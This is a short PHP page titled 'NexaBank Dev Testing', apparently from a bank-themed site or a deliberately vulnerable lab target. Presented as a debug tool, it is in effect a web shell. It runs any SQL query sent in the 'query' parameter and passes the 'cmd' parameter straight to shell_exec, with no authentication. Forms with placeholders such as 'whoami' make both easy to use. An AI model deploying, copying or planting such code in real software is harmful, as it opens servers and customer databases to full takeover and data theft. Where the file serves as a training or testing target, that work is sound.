<?php

require_once 'db_config.php';

if (isset($_GET['query'])) {
    $result = $db->query($_GET['query']);
    if ($result) {
        echo "<pre>Query executed.</pre>";
    } else {
        echo "<pre>Error: " . $db->error . "</pre>";
    }
}

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>NexaBank Dev Testing</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container mt-5">
        <div class="card shadow">
            <div class="card-header bg-danger text-white">
                <h3>NexaBank Dev Testing</h3>
            </div>
            <div class="card-body">
                <p class="text-muted">This page is for debugging only.</p>
                <hr>
                <h4>SQL Query Tester</h4>
                <form method="GET">
                    <div class="mb-3">
                        <input type="text" name="query" class="form-control" placeholder="SELECT * FROM users">
                    </div>
                    <button type="submit" class="btn btn-primary">Execute</button>
                </form>
                <hr>
                <h4>Command Tester</h4>
                <form method="GET">
                    <div class="mb-3">
                        <input type="text" name="cmd" class="form-control" placeholder="whoami">
                    </div>
                    <button type="submit" class="btn btn-primary">Execute</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>